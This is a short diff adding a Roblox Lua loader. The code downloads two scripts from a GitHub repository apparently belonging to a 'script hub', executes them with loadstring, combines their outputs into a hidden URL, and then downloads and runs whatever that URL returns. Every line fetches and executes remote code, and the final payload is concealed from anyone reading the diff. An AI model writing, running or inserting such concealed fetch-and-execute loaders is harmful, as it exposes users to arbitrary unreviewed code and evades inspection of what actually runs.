@@ -1,1 +1,10 @@
+local base = loadstring(game:HttpGet(
+"https://raw.githubusercontent.com/Zoins1/Zinos-Hub-Script.lua-./refs/heads/main/Zoins2"
+))()
 
+local file = loadstring(game:HttpGet(
+"https://raw.githubusercontent.com/Zoins1/Zinos-Hub-Script.lua-./refs/heads/main/Zoins3"
+))()
+
+local finalUrl = base .. file
+loadstring(game:HttpGet(finalUrl))()
